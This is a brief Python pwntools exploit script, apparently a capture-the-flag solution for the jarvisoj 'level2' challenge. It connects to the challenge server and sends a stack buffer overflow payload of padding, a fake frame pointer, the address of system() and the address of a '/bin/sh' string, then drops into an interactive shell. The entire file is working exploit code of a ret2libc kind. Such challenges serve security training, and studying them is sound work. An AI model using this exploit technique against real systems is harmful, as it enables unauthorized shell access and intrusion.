#! /usr/bin/python

from pwn import *

p = remote('pwn2.jarvisoj.com',9878)
elf = ELF('./level2')

offset = 0x88
system = elf.symbols['system']
sh = 0x0804a024

payload = 'A' * 0x88 + 'dead' + p32(system) + 'beef' + p32(sh)
p.sendline(payload)

p.interactive()
